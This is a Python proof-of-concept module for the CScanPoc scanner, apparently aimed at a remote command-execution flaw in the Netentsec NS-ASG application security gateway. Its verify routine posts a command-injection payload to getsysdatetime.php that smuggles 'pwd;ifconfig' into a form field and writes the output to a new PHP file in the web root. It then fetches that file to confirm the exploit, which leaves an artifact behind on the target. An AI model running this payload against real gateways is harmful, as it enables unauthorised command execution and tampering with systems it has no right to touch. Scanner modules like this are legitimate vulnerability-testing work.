# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'Netentsec_0024'  # 平台漏洞编号，留空
    name = '网康NS-ASG 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关命令执行漏洞：
        /protocol/iscdevicestatus/getsysdatetime.php
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '应用安全网关'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '941820e0-d499-4bfa-a929-9658eeafbe6e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            url1 = arg + '/protocol/iscdevicestatus/getsysdatetime.php'
            postdata = "procotalarray[messagecontent]=pwd;ifconfig>/Isc/third-party/httpd/htdocs/vvvv.php;+456"
            code, head, res, errcode, _ = hh.http(url1,post=postdata)
            url2 = arg + '/vvvv.php'
            code, head, res, errcode, _ = hh.http(url2)

            if code==200 and 'Ethernet  HWaddr' in res and 'Mask' in res:
                #security_hole("Command Execution:%s"%url1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
